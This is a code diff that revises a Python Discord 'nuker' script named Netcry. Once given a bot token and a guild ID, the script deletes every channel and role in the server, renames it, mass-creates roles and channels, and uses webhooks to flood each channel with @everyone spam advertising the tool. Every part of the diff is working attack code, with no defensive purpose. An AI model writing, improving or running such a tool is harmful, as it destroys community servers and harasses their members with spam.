@@ -1,23 +1,29 @@
-import sys
-sys.dont_write_bytecode = True
 import asyncio
 import aiohttp
+import threading
+
+#this is nearly as fast as nebula nuker bot lol
+#why are you reading the source code?
+#either you think it is a rat or you are trying to skid it hm
+#property of @a1lw on discord or https://github.com/dropalways
 
 print("This will only work with bot tokens")
 with open("token.txt", "r") as file:
     token = file.readline().strip()
 
 guild_id = input("Guild ID? ")
-themessage = input("What should the message be?[click enter for default] ")
+themessage = input("Enter message [Enter for default]: ")
 if themessage == "":
-    themessage = "@everyone nuked by netcry download at https://github.com/dropalways/netcry-nuker"
-sname = input("What should the new server name be?[click enter for default] ")
+    themessage = "@everyone\n**Netcry was here** <a:trolli:1130231841073414294>\n\nDownload at <https://github.com/dropalways/netcry-nuker> https://cdn.discordapp.com/attachments/1120738685919440907/1130220062133993572/152CF4ED-9F02-4B83-9C68-D683D26B51B7.mov"
+sname = input("Enter new server name [Enter for default]: ")
 if sname == "":
-    sname = "Netcry on top"
-
-num_channels = 15
+    sname = "github.com/dropalways/netcry-nuker"
+num_channels = 49
 num_messages = 75
-num_roles = 50
+num_roles = 40
+
+total_messages_sent = 0
+headers = {'Authorization': f'Bot {token}'}
 
 async def start_bot():
     headers = {'Authorization': f'Bot {token}'}
@@ -25,15 +31,9 @@ async def start_bot():
         await delete_all_roles(session)
         await create_roles(session)
         guild_url = f'https://discord.com/api/v9/guilds/{guild_id}'
-        async with session.get(guild_url) as guild_response:
-            if guild_response.status == 200:
-                await delete_all_channels(session)
-                await change_server_name(session, sname)
-                channels_created = await create_channels_with_webhooks(session)
-                if channels_created:
-                    await send_messages(channels_created, num_messages, session)
-            else:
-                print("Invalid guild ID")
+        await delete_all_channels(session)
+        await change_server_name(session, sname)
+        await create_channels_and_spam(session)
 
 async def delete_all_channels(session):
     print("Deleting channels...")
@@ -46,11 +46,8 @@ async def delete_all_channels(session):
                 channel_id = channel['id']
                 delete_url = f'https://discord.com/api/v9/channels/{channel_id}'
                 delete_tasks.append(session.delete(delete_url))
-                channel.delete_count += 1
-
             await asyncio.gather(*delete_tasks)
-            
-            print(f"Deleted all channels.")
+            print("Deleted all channels.")
         else:
             print("Failed to retrieve channels")
 
@@ -68,19 +65,17 @@ async def delete_all_roles(session):
                     delete_url = f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}'
                     delete_tasks.append(session.delete(delete_url))
                     delete_count += 1
-
             await asyncio.gather(*delete_tasks)
-
             print(f"Deleted {delete_count} roles")
         else:
             print("Failed to retrieve roles")
 
 async def create_roles(session):
     print("Creating roles...")
-    rname = "Net cry on top"
+    rname = "Netcry on top"
     create_role_url = f'https://discord.com/api/v9/guilds/{guild_id}/roles'
     create_role_payload = {
-        'name': 'rname',
+        'name': f'{rname}',
         'color': 0xFF0000,
         'hoist': True,
         'mentionable': True
@@ -88,97 +83,62 @@ async def create_roles(session):
     create_tasks = []
     for _ in range(num_roles):
         create_tasks.append(session.post(create_role_url, json=create_role_payload))
-
     create_responses = await asyncio.gather(*create_tasks)
+    print("Made a shit ton of roles")
 
-    created_roles = sum([1 for response in create_responses if response.status == 200])
-    print(f"Created roles: {created_roles}/{num_roles}")
+async def create_channel_and_spam(session, create_channel_url, create_channel_payload, create_webhook_url, create_webhook_payload):
+    global total_messages_sent
 
-async def create_channels_with_webhooks(session):
-    print("Creating channels and webhooks...")
-    channels_created = []
-    headers = {
-        'Content-Type': 'application/json'
-    }
-    create_tasks = []
-    create_channel_url = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
-    for _ in range(num_channels):
-        create_channel_payload = {
-            'name': 'netcry-on-top',
-            'type': 0
-        }
-        create_tasks.append(session.post(create_channel_url, headers=headers, json=create_channel_payload))
-    create_responses = await asyncio.gather(*create_tasks)
-
-    for create_response in create_responses:
+    async with session.post(create_channel_url, headers=headers, json=create_channel_payload) as create_response:
         if create_response.status == 201:
             channel = await create_response.json()
             channel_id = channel['id']
-            Wname = "https://github.com/dropalways/netcry-nuker"
-            create_webhook_url = f'https://discord.com/api/v9/channels/{channel_id}/webhooks'
-            create_webhook_payload = {
-                'name': f'{Wname}',
-            }
-            create_webhook_response = await session.post(create_webhook_url, headers=headers, json=create_webhook_payload)
-            if create_webhook_response.status == 200:
-                webhook = await create_webhook_response.json()
-                webhook_url = webhook['url']
-                channels_created.append({
-                    'channel_id': channel_id,
-                    'webhook_url': webhook_url
-                })
-                print(f"Created Webhook: {webhook_url}")
+            
+            retry_attempts = 10
+            for attempt in range(retry_attempts):
+                create_webhook_response = await session.post(create_webhook_url.format(channel_id=channel_id), headers=headers, json=create_webhook_payload)
+                if create_webhook_response.status == 200:
+                    webhook = await create_webhook_response.json()
+                    webhook_url = webhook['url']
+                    print(f"Created Webhook: {webhook_url}")
+                    
+                    messages_sent = await spam_webhook(session, webhook_url)
+                    total_messages_sent += messages_sent
+                    break
+                else:
+                    print(f"Failed to create webhook for channel: {channel_id}. Retrying ({attempt + 1}/{retry_attempts})...")
+                    await asyncio.sleep(0.7)
             else:
-                print(f"Failed to create webhook for channel: {channel_id}")
+                print(f"Failed to create webhook for channel: {channel_id} after {retry_attempts} attempts.")
+
         else:
             print("Failed to create channel")
 
-    return channels_created
 
-async def send_message(webhook_url, session):
-    message = {
-        "content": themessage,
-        "avatar_url": "https://cdn.discordapp.com/attachments/1126518423854260246/1128843072034308156/discord-avatar-512-Z9FGP.png",
-        "components": [
-            {
-                "type": 1,
-                "components": [
-                    {
-                        "type": 2,
-                        "style": 5,
-                        "label": "Download the nuker",
-                        "url": "https://github.com/dropalways/netcry-nuker"
-                    }
-                ]
-            }
-        ]
+async def create_channels_and_spam(session):
+    print("Creating channels and webhooks...")
+    headers = {
+        'Content-Type': 'application/json'
     }
-    retry_delay = 1
+    create_channel_url = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
+    create_channel_payload = {
+        'name': 'netcry-on-top',
+        'type': 0
+    }
+    create_webhook_url = f'https://discord.com/api/v9/channels/{{channel_id}}/webhooks'
+    create_webhook_payload = {
+        'name': 'why are you looking at the webhook name | github.com/dropalways/netcry-nuker',
+    }
 
-    while True:
-        try:
-            async with session.post(webhook_url, json=message) as response:
-                if response.status == 204:
-                    print(f"Message sent to webhook: {webhook_url}")
-                    return True
-                else:
-                    print(f"Failed to send message to webhook: {webhook_url}")
-        except aiohttp.ClientError as e:
-            print(f"Error sending message to webhook: {webhook_url}\n{e}")
+    create_tasks = []
+    for _ in range(num_channels):
+        create_task = asyncio.ensure_future(create_channel_and_spam(session, create_channel_url, create_channel_payload, create_webhook_url, create_webhook_payload))
+        create_tasks.append(create_task)
 
-        print(f"Retrying message to webhook: {webhook_url}")
-        await asyncio.sleep(retry_delay)
+    await asyncio.gather(*create_tasks)
 
-async def send_messages(channels_created, num_messages, session):
-    print("Sending messages...")
-    send_tasks = []
+    print(f"Total messages sent: {total_messages_sent}")
 
-    for _ in range(num_messages):
-        for channel in channels_created:
-            send_tasks.append(asyncio.ensure_future(send_message(channel['webhook_url'], session)))
-            await asyncio.sleep(0.1)
-
-    await asyncio.gather(*send_tasks)
 
 async def change_server_name(session, sname):
     print("Changing server name...")
@@ -189,14 +149,43 @@ async def change_server_name(session, sname):
     payload = {
         'name': sname
     }
-
     async with session.patch(url, headers=headers, json=payload) as response:
         if response.status == 200:
             print(f"Server name changed to: {sname}")
         else:
             print("Failed to change server name")
 
-async def start_bot_thread():
-    await start_bot()
+async def spam_webhook(session, webhook_url):
+    messages_sent = 0
 
-asyncio.run(start_bot_thread())
+    message = {
+        "content": f"{themessage}",
+        'username': 'github.com/dropalways/netcry-nuker',
+        "avatar_url": "https://cdn.discordapp.com/emojis/1130231841073414294.gif?size=44&quality=lossless",
+        "components": [
+            {
+                "type": 1,
+                "components": [
+                    {
+                        "type": 2,
+                        "style": 5,
+                        "label": "Download",
+                        "url": "https://github.com/dropalways/netcry-nuker"
+                    }
+                ]
+            }
+        ]
+    }
+
+    while messages_sent < num_messages:
+        async with session.post(webhook_url, json=message) as response:
+            if response.status == 204:
+                print(f"Sent: {webhook_url}")
+                messages_sent += 1
+
+        print(f"Retrying: {webhook_url}")
+
+    return messages_sent
+
+asyncio.run(start_bot())
+#cHJvcGVydHkgb2YgYTFsdw
